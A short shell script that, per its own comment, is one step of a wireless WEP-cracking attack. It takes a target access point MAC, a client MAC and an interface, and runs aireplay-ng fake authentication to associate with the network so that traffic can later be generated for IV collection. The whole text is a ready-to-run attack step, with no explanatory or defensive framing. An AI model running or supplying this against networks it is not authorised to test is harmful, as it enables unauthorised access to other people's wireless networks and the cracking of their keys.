#fake authentication and get associated with the network and then generate IVs to make the network busy.

AP_macad="$1"
NAT_macad="$2"
nic="$3"

aireplay-ng --fakeauth 0 -a "$AP_macad" -h "$NAT_macad" "$nic"
